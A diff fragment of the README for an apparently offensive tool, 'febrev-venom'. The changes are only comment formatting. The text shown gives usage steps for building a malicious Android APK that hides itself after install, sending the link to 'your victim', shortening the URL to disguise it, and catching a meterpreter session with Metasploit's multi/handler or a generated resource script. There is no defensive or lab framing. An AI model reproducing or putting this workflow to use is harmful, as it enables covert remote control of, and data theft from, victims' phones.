@@ -28,10 +28,11 @@ ALSO THE APP CREATED BY MY TOOL CAN AUTOMATICALLY DISAPPEAR AFTER INSTALLING
    python3 febrev-venom.py
    
    
- #use the generated link(the best) + /<your apk> and send it to your victim 
+ # use the generated link(the best) + /<your apk> and send it to your victim 
  then start your msfconsole 
  use exploit/multi/handler
  then set lhost and lport and start the meterpreter session
+   
  # OR simply use the resource script generated automatically by the tool
    -> msfconsole -r <appname_listener.rc>
  # You can shorten the URL by :
@@ -39,7 +40,7 @@ ALSO THE APP CREATED BY MY TOOL CAN AUTOMATICALLY DISAPPEAR AFTER INSTALLING
     2.copy the URL from the current terminal and type -> php shorturl.php <the copied url>
  
  
- happy hacking.....!!!!!
+ # happy hacking.....!!!!!
  
  ################################################################################################################
    
